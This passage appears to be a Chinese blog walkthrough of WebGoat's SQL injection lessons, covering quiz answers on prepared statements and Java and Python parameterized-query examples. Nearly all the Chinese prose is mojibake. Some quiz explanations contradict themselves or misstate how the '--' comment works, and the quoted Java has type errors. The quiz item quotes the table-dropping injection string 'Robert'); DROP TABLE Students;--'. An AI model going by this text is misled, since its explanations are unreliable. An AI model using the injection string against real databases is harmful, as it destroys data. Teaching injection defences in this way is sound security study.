<li><strong>å‚æ•°åŒ–</strong>ï¼šé¢„ç¼–è¯‘è¯­å¥ä½¿ç”¨å ä½ç¬¦æ¥ä»£æ›¿å®é™…çš„å€¼ï¼Œåœ¨æ‰§è¡Œæ—¶å†å°†å®é™…å€¼ç»‘å®šåˆ°å ä½ç¬¦ä¸Šã€‚è¿™æ ·åšå¯ä»¥é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ï¼Œå› ä¸ºå‚æ•°åŒ–çš„å€¼ä¸ä¼šè¢«è§£é‡Šä¸ºSQLä»£ç çš„ä¸€éƒ¨åˆ†ã€‚æ™®é€šè¯­å¥åˆ™ç›´æ¥å°†å€¼åµŒå…¥åˆ°SQLä»£ç ä¸­ï¼Œè¿™å¯èƒ½å¯¼è‡´SQLæ³¨å…¥é£é™©ã€‚</li>
<li><strong>æ€§èƒ½</strong>ï¼šå¯¹äºå¤šæ¬¡æ‰§è¡Œçš„ç›¸åŒSQLç»“æ„ä½†ä¸åŒå‚æ•°çš„æŸ¥è¯¢ï¼Œé¢„ç¼–è¯‘è¯­å¥é€šå¸¸æ¯”æ™®é€šè¯­å¥æ›´å¿«ã€‚è¿™æ˜¯å› ä¸ºæ•°æ®åº“åªéœ€è¦è§£æSQLç»“æ„ä¸€æ¬¡ï¼Œç„¶åå¯ä»¥å¤šæ¬¡ä½¿ç”¨å·²è§£æçš„ç»“æ„æ¥æ‰§è¡ŒæŸ¥è¯¢ã€‚æ™®é€šè¯­å¥æ¯æ¬¡æ‰§è¡Œæ—¶éƒ½éœ€è¦è§£æã€‚</li>
<li><strong>å­˜å‚¨</strong>ï¼šé¢„ç¼–è¯‘è¯­å¥çš„ç»“æ„å¯ä»¥è¢«æ•°æ®åº“å­˜å‚¨ï¼Œä»¥ä¾¿åç»­é‡ç”¨ï¼Œä½†å®é™…çš„å‚æ•°å€¼ä¸ä¼šè¢«å­˜å‚¨ã€‚ç„¶è€Œï¼Œè¿™å–å†³äºæ•°æ®åº“çš„å®ç°å’Œé…ç½®ï¼›æœ‰äº›æ•°æ®åº“å¯èƒ½ä¸å­˜å‚¨é¢„ç¼–è¯‘è¯­å¥çš„ç»“æ„ã€‚æ™®é€šè¯­å¥ä¸ä¼šè¢«å­˜å‚¨ï¼Œé™¤éå®ƒä»¬è¢«åŒ…å«åœ¨å­˜å‚¨è¿‡ç¨‹æˆ–è§¦å‘å™¨ä¸­ã€‚</li>
</ol>
<p>ç„¶åçœ‹é¢˜ç›®</p>
<ul>
<li>Solution 1: Prepared statements are statements with hard-coded parameters.ï¼ˆé”™è¯¯ï¼‰é¢„ç¼–è¯‘è¯­å¥ä¸æ˜¯ä½¿ç”¨ç¡¬ç¼–ç å‚æ•°çš„è¯­å¥ï¼›ç›¸åï¼Œå®ƒä»¬ä½¿ç”¨å ä½ç¬¦æ¥ä»£æ›¿å‚æ•°ã€‚</li>
<li>Solution 2: Prepared statements are not stored in the database.ï¼ˆéƒ¨åˆ†æ­£ç¡®ä½†ä¸å®Œå…¨ï¼‰é¢„ç¼–è¯‘è¯­å¥çš„ç»“æ„å¯ä»¥è¢«æ•°æ®åº“å­˜å‚¨ï¼Œä½†å®é™…çš„å‚æ•°å€¼ä¸ä¼šè¢«å­˜å‚¨ã€‚ç„¶è€Œï¼Œè¿™ä¸ªé€‰é¡¹çš„è¡¨è¿°å¯èƒ½ä¼šå¼•èµ·è¯¯è§£ï¼Œå› ä¸ºå®ƒæš—ç¤ºé¢„ç¼–è¯‘è¯­å¥ä»ä¸è¢«å­˜å‚¨ï¼Œè€Œå®é™…ä¸Šå®ƒä»¬çš„ç»“æ„æœ‰æ—¶ä¼šè¢«å­˜å‚¨ã€‚</li>
<li>Solution 3: A statement is faster.ï¼ˆé”™è¯¯ï¼‰è¿™ä¸ªè¡¨è¿°æ²¡æœ‰æŒ‡æ˜æ˜¯å“ªç§ç±»å‹çš„è¯­å¥ï¼ˆé¢„ç¼–è¯‘çš„è¿˜æ˜¯æ™®é€šçš„ï¼‰ï¼Œè€Œä¸”åœ¨æ²¡æœ‰ä¸Šä¸‹æ–‡çš„æƒ…å†µä¸‹ï¼Œæ— æ³•ç¡®å®šå“ªç§ç±»å‹çš„è¯­å¥æ›´å¿«ã€‚åœ¨é‡å¤æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œé¢„ç¼–è¯‘è¯­å¥é€šå¸¸æ¯”æ™®é€šè¯­å¥æ›´å¿«ã€‚</li>
<li>Solution 4: A statement has got values instead of a prepared statement.ï¼ˆéƒ¨åˆ†æ­£ç¡®ä½†ä¸æ¸…æ™°ï¼‰è¿™ä¸ªé€‰é¡¹ä¼¼ä¹åœ¨æš—ç¤ºæ™®é€šè¯­å¥ç›´æ¥åŒ…å«å€¼ï¼Œè€Œé¢„ç¼–è¯‘è¯­å¥ä½¿ç”¨å ä½ç¬¦ã€‚ç„¶è€Œï¼Œè¿™ä¸ªè¡¨è¿°ä¸å¤Ÿæ¸…æ™°å’Œå‡†ç¡®ã€‚</li>
</ul>
<p>æ²¡æœ‰ä¸€ä¸ªé€‰é¡¹æ˜¯å®Œç¾çš„ç­”æ¡ˆï¼Œä½†å¦‚æœå¿…é¡»é€‰æ‹©ä¸€ä¸ªæœ€æ¥è¿‘çš„ï¼Œé‚£ä¹ˆSolution 4åœ¨ä¿®æ”¹åå¯èƒ½æœ€æ¥è¿‘æ­£ç¡®ç­”æ¡ˆï¼šä¸€ä¸ªæ™®é€šè¯­å¥ï¼ˆéé¢„ç¼–è¯‘çš„ï¼‰ç›´æ¥åœ¨SQLä»£ç ä¸­åŒ…å«å€¼ï¼Œè€Œé¢„ç¼–è¯‘è¯­å¥ä½¿ç”¨å ä½ç¬¦å¹¶åœ¨æ‰§è¡Œæ—¶ç»‘å®šå€¼</p>
<h5 id="2-3">2.</h5>
<p>åœ¨SQLè¯­å¥ä¸­ï¼Œé€šå¸¸ä½¿ç”¨é—®å·(?)ä½œä¸ºå‚æ•°çš„å ä½ç¬¦ã€‚å½“æ‰§è¡Œé¢„ç¼–è¯‘çš„SQLè¯­å¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢å°†å‚æ•°å€¼ç»‘å®šåˆ°å ä½ç¬¦ä¸Šã€‚è¿™æ ·åšå¯ä»¥é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ï¼Œå¹¶æé«˜æŸ¥è¯¢çš„æ€§èƒ½ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨Pythonçš„SQLiteåº“ä¸­ï¼Œå¯ä»¥ä½¿ç”¨é—®å·(?)ä½œä¸ºå ä½ç¬¦ï¼Œå¹¶ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ¥ç»‘å®šå‚æ•°å€¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3  </span><br><span class="line">  </span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;example.db&#x27;</span>)  </span><br><span class="line">cursor = conn.cursor()  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># åˆ›å»ºé¢„ç¼–è¯‘çš„SQLè¯­å¥  </span></span><br><span class="line">query = <span class="string">&quot;INSERT INTO table_name (column1, column2) VALUES (?, ?)&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ç»‘å®šå‚æ•°å€¼  </span></span><br><span class="line">params = (<span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;value2&#x27;</span>)  </span><br><span class="line">cursor.execute(query, params)  </span><br><span class="line">  </span><br><span class="line">conn.commit()  </span><br><span class="line">cursor.close()  </span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œé—®å·(?)ä½œä¸ºå ä½ç¬¦ï¼Œç”¨äºè¡¨ç¤ºå°†è¦æ’å…¥çš„å€¼çš„ä½ç½®ã€‚ç„¶åä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢å°†å‚æ•°å€¼ç»‘å®šåˆ°å ä½ç¬¦ä¸Šï¼Œé¿å…äº†SQLæ³¨å…¥æ”»å‡»çš„é£é™©ã€‚</p>
<h5 id="3-4">3.</h5>
<ol>
<li><strong>Solution 1: They are not static so they can compile better written code than statements.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•å¹¶ä¸å‡†ç¡®ã€‚é¢„ç¼–è¯‘çš„è¯­å¥å’Œæ™®é€šè¯­å¥åœ¨ç¼–è¯‘æ—¶éƒ½æœ‰å…¶åŠ¨æ€å’Œé™æ€çš„æ–¹é¢ã€‚é¢„ç¼–è¯‘çš„è¯­å¥å¹¶ä¸æ˜¯é™æ€çš„ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€å®ƒä»¬èƒ½â€œç¼–è¯‘æ›´å¥½çš„ä»£ç â€ã€‚å®é™…ä¸Šï¼Œé¢„ç¼–è¯‘çš„è¯­å¥ä¸»è¦åœ¨æ‰§è¡Œæ—¶æ›´åŠ é«˜æ•ˆï¼Œè€Œä¸æ˜¯åœ¨ç¼–è¯‘æ—¶ã€‚</li>
</ul>
</li>
<li><strong>Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•æ˜¯æ­£ç¡®çš„ã€‚é¢„ç¼–è¯‘çš„è¯­å¥åœ¨é¦–æ¬¡æ‰§è¡Œæ—¶ä¼šè¢«æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç¼–è¯‘ï¼Œå¹¶ä¸”ä¼šç­‰å¾…è¾“å…¥ã€‚è¿™æ ·çš„é¢„ç¼–è¯‘å¯ä»¥æé«˜åç»­æ‰§è¡Œçš„æ•ˆç‡ï¼Œå› ä¸ºæ•°æ®åº“ç®¡ç†ç³»ç»Ÿå¯ä»¥é‡ç”¨å·²ç¼–è¯‘çš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½é‡æ–°ç¼–è¯‘ã€‚</li>
</ul>
</li>
<li><strong>Solution 3: Prepared statements are stored and wait for input it raises performance considerably.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•æœ‰äº›æ¨¡ç³Šã€‚é¢„ç¼–è¯‘çš„è¯­å¥å¯ä»¥è¢«å­˜å‚¨ä»¥ä¾¿åç»­é‡ç”¨ï¼Œä½†è¿™å¹¶ä¸æ˜¯æé«˜æ€§èƒ½çš„ä¸»è¦åŸå› ã€‚æ›´é‡è¦çš„æ˜¯é¢„ç¼–è¯‘è¯­å¥çš„ç¼–è¯‘å’Œæ‰§è¡Œæ•ˆç‡ã€‚å­˜å‚¨é¢„ç¼–è¯‘çš„è¯­å¥å¯ä»¥è¿›ä¸€æ­¥æé«˜æ€§èƒ½ï¼Œä½†è¿™å¹¶ä¸æ˜¯é¢„ç¼–è¯‘çš„ä¸»è¦ä¼˜åŠ¿ã€‚</li>
</ul>
</li>
<li><strong>Solution 4: Oracle optimized prepared statements. Because of the minimal use of the databases resources it is faster.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•å¯èƒ½åªé€‚ç”¨äºOracleæ•°æ®åº“ç³»ç»Ÿã€‚ç¡®å®ï¼Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆå¦‚Oracleï¼‰å¯èƒ½ä¼šé’ˆå¯¹é¢„ç¼–è¯‘çš„è¯­å¥è¿›è¡Œä¼˜åŒ–ï¼Œä»è€Œä½¿å…¶æ‰§è¡Œå¾—æ›´å¿«ã€‚è¿™æ˜¯å› ä¸ºé¢„ç¼–è¯‘çš„è¯­å¥å‡å°‘äº†åŠ¨æ€SQLå¸¦æ¥çš„æ€§èƒ½å¼€é”€ï¼Œå¦‚è¯­æ³•è§£æå’ŒæŸ¥è¯¢è®¡åˆ’ç”Ÿæˆã€‚ä½†æ˜¯ï¼Œè¿™ç§ä¼˜åŒ–å¹¶ä¸é€‚ç”¨äºæ‰€æœ‰æ•°æ®åº“ç³»ç»Ÿï¼Œæ‰€ä»¥è¿™ä¸ªè¯´æ³•æ˜¯æœ‰é’ˆå¯¹æ€§çš„ã€‚</li>
</ul>
</li>
</ol>
<p>ç»¼ä¸Šæ‰€è¿°ï¼Œæœ€å‡†ç¡®å’Œå…¨é¢çš„è§£é‡Šæ˜¯ï¼šé¢„ç¼–è¯‘çš„è¯­å¥åœ¨é¦–æ¬¡æ‰§è¡Œæ—¶è¢«æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç¼–è¯‘ï¼Œå¹¶åœ¨åç»­æ‰§è¡Œä¸­é‡ç”¨å·²ç¼–è¯‘çš„ç‰ˆæœ¬ï¼Œä»è€Œæé«˜æ€§èƒ½ã€‚è¿™ç§æ€§èƒ½æå‡æ˜¯ç”±äºé¿å…äº†é‡å¤çš„è§£æã€ä¼˜åŒ–å’Œç¼–è¯‘æ­¥éª¤ã€‚æ­¤å¤–ï¼Œä¸€äº›æ•°æ®åº“ç³»ç»Ÿï¼ˆå¦‚Oracleï¼‰è¿˜é’ˆå¯¹é¢„ç¼–è¯‘çš„è¯­å¥è¿›è¡Œäº†ä¼˜åŒ–ï¼Œè¿›ä¸€æ­¥æé«˜äº†å…¶æ€§èƒ½ã€‚</p>
<h5 id="4-3">4.</h5>
<ol>
<li>
<p><strong>Solution 3</strong>ï¼šPlaceholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and dataã€‚</p>
<p>è§£é‡Šï¼šé¢„ç¼–è¯‘çš„è¯­å¥ä½¿ç”¨å ä½ç¬¦æ¥ä»£æ›¿ç”¨æˆ·è¾“å…¥ï¼Œç¡®ä¿ç”¨æˆ·è¾“å…¥ä¸SQLæŸ¥è¯¢çš„é€»è¾‘åˆ†ç¦»ã€‚è¿™æ„å‘³ç€ç”¨æˆ·è¾“å…¥ä¸ä¼šè¢«è§£é‡Šä¸ºSQLä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œé˜²æ­¢äº†SQLæ³¨å…¥æ”»å‡»ã€‚é€šè¿‡ä½¿ç”¨å ä½ç¬¦ï¼Œæ•°æ®åº“ç³»ç»Ÿèƒ½å¤Ÿæ§åˆ¶å’ŒéªŒè¯è¾“å…¥çš„æ ¼å¼å’Œç±»å‹ï¼Œæœ‰æ•ˆåœ°é˜²æ­¢æ¶æ„è¾“å…¥è¢«è§£é‡Šä¸ºSQLå‘½ä»¤ã€‚è¿™ç§åˆ†ç¦»ç¡®ä¿äº†ä»£ç å’Œæ•°æ®çš„å®‰å…¨æ€§ï¼Œé˜²æ­¢äº†æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p>
</li>
<li>
<p><strong>Solution 1: Prepared statements have got an inner check to distinguish between input and logical errors.</strong></p>
<ul>
<li>è¿™ä¸ªè¯´æ³•å¹¶ä¸å‡†ç¡®ã€‚é¢„ç¼–è¯‘çš„è¯­å¥æœ¬èº«å¹¶æ²¡æœ‰ä¸€ä¸ªâ€œå†…éƒ¨æ£€æŸ¥â€æ¥åŒºåˆ†è¾“å…¥å’Œé€»è¾‘é”™è¯¯ã€‚é¢„ç¼–è¯‘çš„è¯­å¥ä¸»è¦æ˜¯é€šè¿‡å‚æ•°åŒ–è¾“å…¥æ¥é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ï¼Œè€Œä¸æ˜¯é€šè¿‡åŒºåˆ†è¾“å…¥å’Œé€»è¾‘é”™è¯¯ã€‚</li>
</ul>
</li>
<li>
<p><strong>Solution 2: Prepared statements use the placeholders to make rules what input is allowed to use.</strong></p>
<ul>
<li>è¿™ä¸ªè¯´æ³•ä¹Ÿæ˜¯ä¸å‡†ç¡®çš„ã€‚è™½ç„¶é¢„ç¼–è¯‘çš„è¯­å¥ç¡®å®ä½¿ç”¨å ä½ç¬¦ï¼Œä½†å®ƒä»¬å¹¶ä¸æ˜¯ç”¨æ¥â€œåˆ¶å®šè§„åˆ™â€æ¥å†³å®šè¾“å…¥çš„ä½¿ç”¨æ–¹å¼ã€‚å ä½ç¬¦çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†å®‰å…¨åœ°å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œé˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚</li>
</ul>
</li>
<li>
<p><strong>Solution 4: Prepared statements always read inputs literally and never mixes it with its SQL commands.</strong></p>
<ul>
<li>è¿™ä¸ªè¯´æ³•éƒ¨åˆ†æ­£ç¡®ï¼Œä½†ä¹Ÿéƒ¨åˆ†è¯¯å¯¼ã€‚é¢„ç¼–è¯‘çš„è¯­å¥ç¡®å®å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºå­—é¢å€¼å¤„ç†ï¼Œè€Œä¸æ˜¯å°†å…¶è§£é‡Šä¸ºSQLä»£ç çš„ä¸€éƒ¨åˆ†ã€‚ä½†æ˜¯ï¼Œè¿™å¹¶ä¸æ„å‘³ç€é¢„ç¼–è¯‘çš„è¯­å¥â€œä»ä¸æ··åˆâ€è¾“å…¥ä¸SQLå‘½ä»¤ã€‚å®é™…ä¸Šï¼Œé¢„ç¼–è¯‘çš„è¯­å¥åœ¨æ‰§è¡Œæ—¶ï¼Œä¼šå°†å ä½ç¬¦æ›¿æ¢ä¸ºå®é™…çš„ç”¨æˆ·è¾“å…¥ï¼Œå¹¶ä¸SQLå‘½ä»¤ä¸€èµ·æ‰§è¡Œã€‚å…³é”®åœ¨äºè¿™ç§æ›¿æ¢æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºå ä½ç¬¦ç¡®ä¿äº†ç”¨æˆ·è¾“å…¥è¢«å½“ä½œæ•°æ®è€Œä¸æ˜¯ä»£ç å¤„ç†ã€‚</li>
</ul>
</li>
</ol>
<p>ç»¼ä¸Šæ‰€è¿°ï¼Œé¢„ç¼–è¯‘çš„è¯­å¥é€šè¿‡ä½¿ç”¨å ä½ç¬¦æ¥åˆ†ç¦»ä»£ç å’Œæ•°æ®ï¼Œç¡®ä¿ç”¨æˆ·è¾“å…¥è¢«å½“ä½œæ•°æ®è€Œä¸æ˜¯ä»£ç å¤„ç†ï¼Œä»è€Œæœ‰æ•ˆåœ°é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚</p>
<h5 id="5-5">5.</h5>
<p>è¿™æ®µä»£ç è¯•å›¾åœ¨è¡¨å•ä¸­è¾“å…¥æ¶æ„SQLä»£ç ï¼Œç›®çš„æ˜¯åˆ é™¤åä¸º&quot;Students&quot;çš„è¡¨ã€‚</p>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬é€ä¸€åˆ†ææä¾›çš„è§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li><strong>Solution 1: The table Students and all of its content will be deleted.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•æ˜¯é”™è¯¯çš„ã€‚å¦‚æœä¸€ä¸ªæ¶æ„ç”¨æˆ·å°è¯•ä½¿ç”¨è¿™æ ·çš„è¾“å…¥ï¼Œå¹¶ä¸”æ•°æ®åº“æ²¡æœ‰é‡‡å–é€‚å½“çš„é¢„é˜²æªæ–½ï¼ˆä¾‹å¦‚ä½¿ç”¨é¢„ç¼–è¯‘çš„è¯­å¥ï¼‰ï¼Œé‚£ä¹ˆè¡¨&quot;Students&quot;åŠå…¶æ‰€æœ‰å†…å®¹å°†è¢«åˆ é™¤ã€‚ä½†æ˜¯æ²¡æœ‰æåŠæ³¨å†Œæ–°ç”¨æˆ·</li>
</ul>
</li>
<li><strong>Solution 2: The input deletes all students with the name Robert.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•æ˜¯ä¸æ­£ç¡®çš„ã€‚å®é™…ä¸Šï¼Œè¿™æ®µä»£ç ä¼šåˆ é™¤æ•´ä¸ª&quot;Students&quot;è¡¨ï¼Œè€Œä¸æ˜¯åªåˆ é™¤åä¸º&quot;Robert&quot;çš„å­¦ç”Ÿã€‚</li>
</ul>
</li>
<li><strong>Solution 3: The database registers â€˜Robertâ€™ and deletes the table afterwards.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•ä¹Ÿæ˜¯ä¸æ­£ç¡®çš„ã€‚å®é™…ä¸Šï¼Œè¿™æ®µä»£ç ä¼šé¦–å…ˆå°è¯•å°†â€™Robertâ€™æ’å…¥åˆ°æŸä¸ªå­—æ®µä¸­ï¼Œç„¶åæ‰§è¡Œåˆ é™¤&quot;Students&quot;è¡¨çš„å‘½ä»¤ã€‚</li>
</ul>
</li>
<li><strong>Solution 4: The database registers â€˜Robertâ€™ ); DROP TABLE Students;â€“'.</strong>
<ul>
<li>è¿™ä¸ªè¯´æ³•æ˜¯æ­£ç¡®çš„ã€‚å¦‚æœæ•°æ®åº“æ²¡æœ‰é‡‡å–é€‚å½“çš„é¢„é˜²æªæ–½ï¼Œè¿™æ®µä»£ç å°†å°è¯•é¦–å…ˆå°†â€™Robertâ€™æ’å…¥åˆ°æŸä¸ªå­—æ®µä¸­ï¼Œç„¶åæ‰§è¡Œåˆ é™¤&quot;Students&quot;è¡¨çš„å‘½ä»¤ã€‚â€“`éƒ¨åˆ†æ˜¯ä¸ºäº†é˜²æ­¢SQLè§£æå™¨å°†å…¶ä½™éƒ¨åˆ†è§†ä¸ºæ³¨é‡Šã€‚</li>
</ul>
</li>
</ol>
<p>æœ€æ€»ç­”æ¡ˆï¼š43234</p>
<h3 id="3-SQL-Injection-mitigation-ï¼ˆSQLæ³¨å…¥ç¼“è§£ï¼‰">3.SQL Injection(mitigation)ï¼ˆSQLæ³¨å…¥ç¼“è§£ï¼‰</h3>
<h4 id="1-4">1-4</h4>
<p>ä»‹ç»å¦‚ä½•å‡å°SQLæ³¨å…¥çš„ç¼ºé™·ï¼Œä½¿ç”¨PreparedStatement</p>
<p>è´´ä¸€ä¸‹æºç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - Java Snippetå‚æ•°åŒ–æŸ¥è¯¢ï¼ˆjavaä»£ç ç‰‡æ®µï¼‰</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> bool <span class="title function_">isUsernameValid</span><span class="params">(string username)</span> &#123;</span><br><span class="line">    <span class="type">RegEx</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Regex</span>(<span class="string">&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> r.isMatch(username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.sql.Connection conn is set elsewhere for brevity.</span></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">RecordSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    pUserName = request.getParameter(<span class="string">&quot;UserName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( isUsernameValid (pUsername) ) &#123;</span><br><span class="line">        ps = conn.prepareStatement(<span class="string">&quot;SELECT * FROM user_table</span></span><br><span class="line"><span class="string">                                   WHERE username = ? &quot;</span>);</span><br><span class="line">        ps.setString(<span class="number">1</span>, pUsername);</span><br><span class="line">        rs = ps.execute();</span><br><span class="line">        <span class="keyword">if</span> ( rs.next() ) &#123;</span><br><span class="line">            <span class="comment">// do the work of making the user record active in some way</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// handle invalid input &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (...) &#123; <span class="comment">// handle all exceptions ... &#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - Java Exampleï¼ˆjavaæ¡ˆä¾‹ï¼‰</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">loadAccount</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// Parser returns only valid string data</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">accountID</span> <span class="operator">=</span> getParser().getStringParameter(ACCT_ID, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?&quot;</span>;</span><br><span class="line">  <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query)) &#123;</span><br><span class="line">     statement.setString(<span class="number">1</span>, accountID);</span><br><span class="line">     <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line">     <span class="keyword">if</span> (results != <span class="literal">null</span> &amp;&amp; results.first()) &#123;</span><br><span class="line">       results.last(); <span class="comment">// Only one record should be returned for this query</span></span><br><span class="line">       <span class="keyword">if</span> (results.getRow() &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">         data = processAccount(results);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// Handle the error - Database integrity issue</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">// Handle the error - no records found &#125;</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException sqle) &#123;</span><br><span class="line">    <span class="comment">// Log and handle the SQL Exception &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>aiç»™å‡ºçš„è§£é‡Šï¼š</p>
<p><code>PreparedStatement</code> æ˜¯ Java JDBC ä¸­çš„ä¸€ä¸ªæ¥å£ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªé¢„ç¼–è¯‘çš„ SQL è¯­å¥ã€‚é¢„ç¼–è¯‘çš„ SQL è¯­å¥å¯ä»¥åœ¨å¤šæ¬¡æ‰§è¡Œæ—¶é‡å¤ä½¿ç”¨ï¼Œè¿™å¯ä»¥æé«˜æ‰§è¡Œæ•ˆç‡ã€‚æ­¤å¤–ï¼Œ<code>PreparedStatement</code> è¿˜å¯ä»¥é˜²æ­¢ SQL æ³¨å…¥æ”»å‡»ï¼Œå› ä¸ºå®ƒå…è®¸ä½ å°†å‚æ•°ä½œä¸ºé¢„ç¼–è¯‘è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ç›´æ¥å°†å‚æ•°åµŒå…¥åˆ° SQL è¯­å¥ä¸­ã€‚</p>
<p>ä½¿ç”¨ <code>PreparedStatement</code> çš„ä¸»è¦å¥½å¤„æ˜¯ï¼š</p>
<ol>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šé¢„ç¼–è¯‘çš„ SQL è¯­å¥åªéœ€è¦è¢«è§£æå’Œç¼–è¯‘ä¸€æ¬¡ï¼Œç„¶åå¯ä»¥å¤šæ¬¡æ‰§è¡Œã€‚è¿™é€šå¸¸æ¯”ä½¿ç”¨ <code>Statement</code> å¯¹è±¡æ›´å¿«ï¼Œå› ä¸ºå®ƒé¿å…äº†é‡å¤çš„è§£æå’Œç¼–è¯‘å¼€é”€ã€‚</li>
<li><strong>é˜²æ­¢ SQL æ³¨å…¥</strong>ï¼šé€šè¿‡ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼Œä½ å¯ä»¥é¿å… SQL æ³¨å…¥æ”»å‡»ã€‚å½“ä½¿ç”¨ <code>PreparedStatement</code> æ—¶ï¼Œå‚æ•°å€¼ä¸ä¼šè¢«è§£é‡Šä¸º SQL ä»£ç ï¼Œè€Œæ˜¯ä½œä¸ºæ•°æ®ä¼ é€’ï¼Œä»è€Œæé«˜äº†å®‰å…¨æ€§ã€‚</li>
